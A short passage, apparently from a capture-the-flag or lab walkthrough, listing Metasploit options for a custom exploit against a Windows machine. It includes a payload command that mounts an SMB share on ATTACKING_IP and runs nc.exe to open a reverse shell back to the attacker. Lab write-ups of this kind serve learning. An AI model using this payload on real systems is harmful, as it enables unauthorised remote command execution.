...
- Set `SRVHOST = tun0 IP or Attack Box IP` (just for safety)
- Set `TARGET = 3` (to use our custom exploit)
- Set `DisablePayloadHandler = True` (I had issues getting the exploit to run without this)
- Set `CMD = 'cmd.exe /c net use a: \\ATTACKING_IP\share /user:test test ^& a:\nc.exe ATTACKING_IP PORT -e cmd.exe' ` (final payload)
- Host an SMB server hosting nc.exe (for Windows account to use)
